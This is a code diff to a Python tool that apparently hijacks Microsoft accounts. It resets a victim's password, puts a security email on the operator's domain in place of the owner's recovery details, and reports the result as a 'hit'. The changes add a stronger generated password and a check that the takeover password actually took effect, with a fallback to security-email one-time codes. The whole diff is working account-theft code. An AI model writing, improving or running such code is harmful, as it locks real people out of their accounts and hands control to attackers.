@@ -1,6 +1,7 @@
 from securing.utils.login_authenticator import login_authenticator
 from securing.utils.cookies.get_livedata import livedata
-from securing.utils.security.recovery import recover
+from securing.utils.security.recovery import recover, verify_password_works
+from securing.utils.security.password_gen import generate_ms_password
 from securing.utils.cookies.get_email_code import get_email_code
 from securing.secure import startSecuringAccount
 from securing.auth.send_auth import send_auth
@@ -111,7 +112,7 @@ async def recovery_secure(email: str, method: str, data: dict) -> dict:
                 )
 
             sname = uuid.uuid4().hex[:16]
-            password = uuid.uuid4().hex[:12]
+            password = generate_ms_password(16)
             security_email = f"{sname}@{config["domain"]}"
             print(f"[+] - Generated Security Email ({security_email})")
 
@@ -132,6 +133,23 @@ async def recovery_secure(email: str, method: str, data: dict) -> dict:
                     return None
 
                 print("[+] - Changed password and recovery code")
+
+                # Verify password actually stuck. If not, keep going via OTP but
+                # mark password as unreliable so the hit embed doesn't lie.
+                pwd_status = await verify_password_works(session, email, password)
+                if pwd_status == "ok":
+                    print("[+] - Password verified OK")
+                elif pwd_status == "bad":
+                    print("[!] - Password did NOT stick — login will use security-email OTP")
+                    logging.error(
+                        "Password not applied for %s after RecoverUser (publicKey/format). "
+                        "Reported password will be marked unreliable.",
+                        email,
+                    )
+                    # Keep the attempted password in the result for debugging, but flag it
+                    password = f"{password} (UNVERIFIED — may not work)"
+                else:
+                    print("[~] - Password verify inconclusive (continuing)")
 
                 info = await send_auth(session, email, security_email)
                 flowtoken, auth_error = _flowtoken_from_auth(info)
